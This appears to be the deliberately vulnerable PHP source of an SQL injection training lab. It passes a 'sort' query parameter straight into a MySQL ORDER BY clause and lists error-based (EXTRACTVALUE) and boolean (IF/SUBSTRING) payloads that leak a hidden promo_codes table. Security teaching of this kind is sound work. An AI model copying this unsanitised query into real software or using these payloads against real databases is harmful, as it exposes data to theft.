<?php
/*
 * SQLi-Arena. MySQL Lab 15: ORDER BY / GROUP BY Injection
 * SOURCE CODE (shown in White-Box mode)
 *
 * This is the vulnerable portion of the lab.
 */

// Database connection (per-lab isolation)
require_once __DIR__ . '/../../includes/db.php';

// Get user input: sort column from query string
$sort = $_GET['sort'] ?? 'id';

// VULNERABLE: User input directly interpolated into ORDER BY clause (NOT quoted).
// Because ORDER BY does not accept quoted strings as column references,
// the input is placed directly: making it injectable.
// UNION SELECT does NOT work after ORDER BY (syntax error).
// Must use error-based or conditional techniques.
$query = "SELECT id, name, price, category, rating FROM products ORDER BY $sort";

$result = mysqli_query($conn, $query);

if ($result) {
    while ($row = mysqli_fetch_assoc($result)) {
        echo $row['id'] . " | " . $row['name'] . " | $" . $row['price'] . " | " . $row['category'] . " | " . $row['rating'] . "\n";
    }
} else {
    echo "Error: " . mysqli_error($conn);
}

// Hidden table structure:
// CREATE TABLE promo_codes (id INT, code VARCHAR(100), discount INT);
//
// Attack vectors:
// 1. Error-based in ORDER BY:
//    sort = (EXTRACTVALUE(1, CONCAT(0x7e, (SELECT code FROM promo_codes LIMIT 1))))
//    Triggers XPATH error that leaks the promo code.
//
// 2. Conditional / Boolean in ORDER BY:
//    sort = IF(SUBSTRING((SELECT code FROM promo_codes LIMIT 1),1,1)='F', price, name)
//    Different sort order reveals true/false: acts as a boolean oracle.
//
// 3. Column index confirmation:
//    sort = 1   (works: sorts by first column)
//    sort = 999 (errors: column index out of range)
